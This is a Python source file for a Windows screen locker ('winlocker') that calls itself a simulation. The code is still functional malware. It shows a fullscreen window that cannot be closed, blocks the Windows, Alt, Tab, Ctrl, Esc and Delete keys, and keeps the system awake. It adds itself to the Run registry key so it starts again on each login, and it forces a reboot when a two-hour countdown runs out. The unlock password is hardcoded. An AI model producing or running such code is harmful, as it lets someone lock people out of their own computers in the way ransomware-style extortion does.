import tkinter as tk
from tkinter import messagebox
import time
import threading
import ctypes
import platform
import keyboard
import os
import sys
import winreg


def prevent_shutdown():
    if platform.system() == "Windows":
        ES_CONTINUOUS = 0x80000000
        ES_SYSTEM_REQUIRED = 0x00000001
        ES_DISPLAY_REQUIRED = 0x00000002
        ctypes.windll.kernel32.SetThreadExecutionState(
            ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED
        )


def block_system_keys():
    keys_to_block = [
        'windows', 'left windows', 'right windows',
        'alt', 'tab', 'esc', 'ctrl', 'delete'
    ]
    for key in keys_to_block:
        keyboard.block_key(key)


def add_to_startup():
    file_path = os.path.abspath(sys.argv[0])
    app_name = "WinlockerSim"

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Failed to add to startup: {e}")


def force_restart():
    if platform.system() == "Windows":
        os.system("shutdown /r /t 0")


class WinlockerSim:
    def __init__(self, root):
        self.root = root
        self.root.title("System Locked (Simulation)")
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg='black')
        self.root.protocol("WM_DELETE_WINDOW", self.disable_event)
        self.root.overrideredirect(True)
        self.root.resizable(False, False)

        self.correct_password = "67148869"
        self.time_left = 2 * 3600
        self.timer_running = True

        self.root.bind_all('<Key>', self.block_keys)
        self.create_ui()

        block_system_keys()
        prevent_shutdown()
        add_to_startup()

        self.thread = threading.Thread(target=self.update_timer)
        self.thread.daemon = True
        self.thread.start()

    def disable_event(self):
        pass

    def block_keys(self, event):
        if event.keysym in [
            'Super_L', 'Super_R', 'Command_L', 'Command_R',
            'Alt_L', 'Alt_R', 'Tab', 'Escape',
            'Control_L', 'Control_R', 'Delete'
        ]:
            return "break"

    def create_ui(self):
        self.skull_label = tk.Label(
            self.root, text="🪦", font=("Arial", 100), fg="red", bg="black"
        )
        self.skull_label.pack(pady=20)

        self.warning_label = tk.Label(
            self.root,
            text="SYSTEM LOCKED! Enter the correct password to unlock.",
            font=("Arial", 20, "bold"),
            fg="red",
            bg="black"
        )
        self.warning_label.pack(pady=10)

        self.password_entry = tk.Entry(
            self.root,
            show="*",
            font=("Arial", 16),
            width=20,
            bg="gray20",
            fg="white",
            insertbackground="white"
        )
        self.password_entry.pack(pady=10)
        self.password_entry.focus_set()

        self.unlock_button = tk.Button(
            self.root,
            text="Unlock",
            command=self.check_password,
            font=("Arial", 14),
            bg="red",
            fg="white",
            activebackground="darkred"
        )
        self.unlock_button.pack(pady=10)

        self.time_label = tk.Label(
            self.root,
            text=self.format_time(self.time_left),
            font=("Arial", 16),
            fg="red",
            bg="black"
        )
        self.time_label.pack(pady=10)
        self.canvas = tk.Canvas(self.root, width=600, height=30, bg="black", highlightthickness=0)
        self.canvas.pack(pady=10)
        self.progress_bar = self.canvas.create_rectangle(0, 0, 600, 30, fill="red")

        self.root.bind('<Return>', lambda event: self.check_password())

    def format_time(self, seconds):
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        seconds = seconds % 60
        return f"Time remaining: {hours:02d}:{minutes:02d}:{seconds:02d}"

    def update_timer(self):
        while self.time_left > 0 and self.timer_running:
            self.time_left -= 1
            # Исправлено: используем after для безопасного обновления из другого потока
            self.root.after(0, self.update_timer_display)
            time.sleep(1)

        if self.time_left <= 0 and self.timer_running:
            self.timer_running = False
            self.root.after(0, self.time_expired)

    def update_timer_display(self):
        self.time_label.config(text=self.format_time(self.time_left))

        progress_width = (self.time_left / (2 * 3600)) * 600
        if progress_width < 0:
            progress_width = 0
        self.canvas.coords(self.progress_bar, 0, 0, progress_width, 30)

    def time_expired(self):
        messagebox.showinfo("Time's Up", "Time has expired! Restarting... (Simulation)")
        force_restart()

    def check_password(self):
        entered_password = self.password_entry.get()
        if entered_password == self.correct_password:
            self.timer_running = False
            messagebox.showinfo("Success", "Correct password! Unlocking... (Simulation)")
            self.root.quit()
        else:
            messagebox.showerror("Error", "Incorrect password!")
            self.password_entry.delete(0, tk.END)


if __name__ == "__main__":
    root = tk.Tk()
    app = WinlockerSim(root)
    root.mainloop()